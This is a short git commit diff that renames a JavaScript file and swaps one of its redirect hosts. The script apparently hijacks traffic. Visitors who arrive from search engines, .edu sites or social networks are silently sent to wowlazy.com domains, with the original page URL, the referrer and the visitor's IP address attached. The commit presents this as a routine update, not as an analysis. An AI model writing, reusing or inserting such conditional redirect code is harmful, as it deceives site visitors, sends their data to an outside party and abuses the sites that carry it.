b04a5f4404639fa604f83e52d80b0db7e7d02895
pgpump <pg079898@gmail.com>
2025-06-02 12:04:20 +0700

    Update and rename lowtiers.js to lowtier1.js

--- lowtier1.js
+++ lowtier1.js
@@ -1,4 +1,4 @@
-var ars = ['https://mid.wowlazy.com', 'https://stocks.example.com'][Math.floor(Math.random() * 2)];
+var ars = ['https://mid.wowlazy.com', 'https://stocks.wowlazy.com'][Math.floor(Math.random() * 2)];
 if(['.edu.', '.google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ 
     window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + "&ip=" + window.ipAddressArsae;
 }
